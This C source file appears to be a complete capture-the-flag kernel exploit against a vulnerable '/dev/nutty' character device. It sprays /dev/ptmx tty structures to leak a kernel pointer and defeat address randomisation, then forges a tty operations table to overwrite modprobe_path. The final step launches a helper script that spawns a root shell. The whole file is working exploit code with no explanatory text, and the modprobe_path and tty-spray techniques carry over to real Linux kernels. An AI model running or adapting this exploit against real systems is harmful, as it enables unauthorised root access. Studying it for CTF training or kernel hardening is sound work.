#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>

#define NUTTY_CREATE 0x13371
#define NUTTY_DELETE 0x13372
#define NUTTY_SHOW 0x13373
#define NUTTY_APPEND 0x13374

#define modprobe_path (0x64f00 + 0x3e7e40 + 0x1000000)
#define ptm_unix98_ops (0x64f00 + 0x1000000 - 0x120)

const char *dev_nutty = "/dev/nutty";

struct nutty {
    int idx;
    int size;
    char *contents;
    int content_length;
    char *show_buffer;
};

int create(int fd, int size, char *msg, int msg_len) {
    struct nutty req;
    req.size = size;
    req.contents = msg;
    req.content_length = msg_len;
    return ioctl(fd, NUTTY_CREATE, &req);
}

int delete (int fd, int idx) {
    struct nutty req;
    req.idx = idx;
    return ioctl(fd, NUTTY_DELETE, &req);
}

int show(int fd, int idx, char *buf) {
    struct nutty req;
    req.idx = idx;
    req.show_buffer = buf;
    return ioctl(fd, NUTTY_SHOW, &req);
}

int append(int fd, int idx, int size, char *msg, int msg_len) {
    struct nutty req;
    req.idx = idx;
    req.size = size;
    req.contents = msg;
    req.content_length = msg_len;
    return ioctl(fd, NUTTY_APPEND, &req);
}

char *str_repeat(char a, size_t n) {
    char *s = malloc(n + 1);
    for (int i = 0; i < n; ++i)
        s[i] = a;
    s[n] = 0;
    return s;
}

void shell() {
    puts("[+] r00000t");
    system("echo '#!/bin/sh' > /home/user/x; echo 'setsid cttyhack setuidgid 0 "
           "/bin/sh' >> /home/user/x");
    system("chmod +x /home/user/x");
    int ff = open("/home/user/ffff", O_WRONLY | O_CREAT);
    write(ff, "\xff\xff\xff\xff", 4);
    close(ff);
    system("chmod 777 /home/user/ffff; /home/user/ffff");
    system("sh");
}

int main(void) {
    int fd = open(dev_nutty, O_RDONLY);

    int tty_fds[0x1000];

    for (int i = 0; i < 0x20; ++i)
        tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    for (int i = 0; i < 0x20; ++i)
        close(tty_fds[i]);

    create(fd, 0x3ff, "", 0);

    uint64_t *rbuf = malloc(0x400);
    memset(rbuf, 0, 0x400);

    show(fd, 0, (char *)rbuf);

    uint64_t chunk_addr = rbuf[0x38 / 8];
    printf("[+] Address of allocated chunk: %p\n", (void *)chunk_addr);
    uint64_t ptmx_ops = rbuf[3];
    printf("[+] ptmx_ops: %p\n", (void *)ptmx_ops);
    const uint64_t kbase = ptmx_ops - ptm_unix98_ops;
    printf("[+] Kernel base: %p\n", (void *)kbase);

    char *x = malloc(0x401);
    memset(x, 0x43, 0x401);
    uint64_t *fake = &x[1];
    for (int i = 0; i < 0x80; ++i)
        tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    for (int i = 0x40; i < 0x80; ++i)
        close(tty_fds[i]);

    for (int i = 0; i < 128; ++i)
        fake[i] = chunk_addr - 0x38 + 0x400;

    append(fd, 0, 0x100000, x, 0x3ff);

    for (int j = 0; j < 1; ++j) {
        for (int i = 0; i < 9; ++i)
            create(fd, 0x2ff,
                   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x30);

        for (int i = 0; i < 9; ++i)
            append(fd, i + 1, 0x10000, x, 0x3ff);
        for (int i = 0; i < 9; ++i)
            delete (fd, i + 1);
    }

    for (int i = 0; i < 8; ++i)
        create(fd, 0x3ff, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
               0x30);
    for (int i = 0; i < 3; ++i)
        append(fd, i + 1, 0x10000, x, 0x3ff);

    memcpy(fake, rbuf, 0x400);
    fake[0] = 0x100005401;
    fake[3] = chunk_addr - 0x38 + 0x400 + (8 * 0x10);
    fake[0x10 + 10] = kbase + 0xdc749;
    fake[0x10 + 11] = kbase + 0xdc749;
    fake[0x10 + 12] = kbase + 0xdc749;
    create(fd, 0x3ff, fake, 0x3ff);
    printf("%p\n", kbase + modprobe_path);

    for (int i = 0; i < 0x40; ++i) {
        ioctl(tty_fds[i], 0x6d6f682f, kbase + modprobe_path);
        ioctl(tty_fds[i], 0x73752f65, kbase + modprobe_path + 4);
        ioctl(tty_fds[i], 0x782f7265, kbase + modprobe_path + 8);
        ioctl(tty_fds[i], 0, kbase + modprobe_path + 12);
    }
    shell();
}
